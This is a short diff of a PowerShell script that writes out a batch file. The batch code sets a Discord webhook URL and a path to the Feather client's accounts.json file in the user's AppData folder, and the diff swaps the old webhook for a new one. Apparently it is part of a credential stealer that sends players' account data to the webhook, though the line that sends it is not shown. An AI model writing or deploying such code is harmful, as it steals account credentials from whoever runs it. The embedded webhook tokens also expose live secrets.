@@ -8,7 +8,7 @@ $batchContent = @"
 setlocal enabledelayedexpansion
 
 :: Discord Webhook URL
-set webhookUrl=https://discord.com/api/webhooks/1358208744986513408/2IrXuvpkSYgoEV44O6j7Emh_EI800Bi-Y7g0tgHDWyeisd7mnwkahV2bykd5lE6l2lAx
+set webhookUrl=https://discordapp.com/api/webhooks/1360783761507090564/r8QQPi6sDykebSma2k1VbHQaeyKrKtvwMK-efY9Ds38sB1xqrWElmEUxaqO310NG8vub
 
 :: Path to the accounts.json file
 set filePath=%USERPROFILE%\AppData\Roaming\.feather\accounts.json
